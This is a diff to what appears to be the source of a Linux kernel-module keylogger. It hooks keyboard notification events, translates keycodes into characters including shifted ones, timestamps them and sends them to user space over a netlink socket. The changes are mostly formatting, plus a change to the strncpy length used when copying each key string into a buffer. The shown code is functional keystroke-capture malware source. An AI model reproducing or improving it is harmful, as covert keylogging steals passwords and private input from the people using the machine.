@@ -16,8 +16,8 @@
 #define SEP_BUFFSIZE      500
 
 /* Function Prototypes */
-static int kb_notify(struct notifier_block *, unsigned long, void *);       /* Keyboard notification callback */
-static void nl_send_msg(void);                                              /* Netlink callback for sending info to user space */
+static int kb_notify(struct notifier_block *, unsigned long, void *);
+static void nl_send_msg(void);
 
 /* Keypress mappings */
 static const char* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
@@ -43,7 +43,7 @@ static const char* keymapShiftActivated[] =
 
 static struct semaphore sem;
 
-/* Specify which function to call for keyboard notification events */
+/* Specify callback function for keyboard notification events */
 static struct notifier_block kb_nb = { .notifier_call = kb_notify };
 
 /* Kernel netlink socket */
@@ -68,7 +68,10 @@ struct keypress {
 static int shiftKeyDepressed = 0;
 
 /* Keyboard notification callback */
-static int kb_notify(struct notifier_block *nblock, unsigned long action, void *data)
+static int kb_notify(
+    struct notifier_block *nblock,
+    unsigned long action,
+    void *data)
 {
     unsigned long jiff, curr_stamp = 0;
     jiff = jiffies;
@@ -101,9 +104,11 @@ static int kb_notify(struct notifier_block *nblock, unsigned long action, void *
 
             /* Retrieve the correct caps or non-caps character string */
             if (shiftKeyDepressed == 0)
-                strncpy(keypress_buff, keymap[key.keycode], strlen(keymap[key.keycode]));
+                // strncpy(keypress_buff, keymap[key.keycode], strlen(keymap[key.keycode]));
+                strncpy(keypress_buff, keymap[key.keycode], KEYPRESS_BUFFSIZE);
             else
-                strncpy(keypress_buff, keymapShiftActivated[key.keycode], strlen(keymapShiftActivated[key.keycode]));
+                // strncpy(keypress_buff, keymapShiftActivated[key.keycode], strlen(keymapShiftActivated[key.keycode]));
+                strncpy(keypress_buff, keymapShiftActivated[key.keycode], KEYPRESS_BUFFSIZE);
 
             if(!init_stamp)
             {
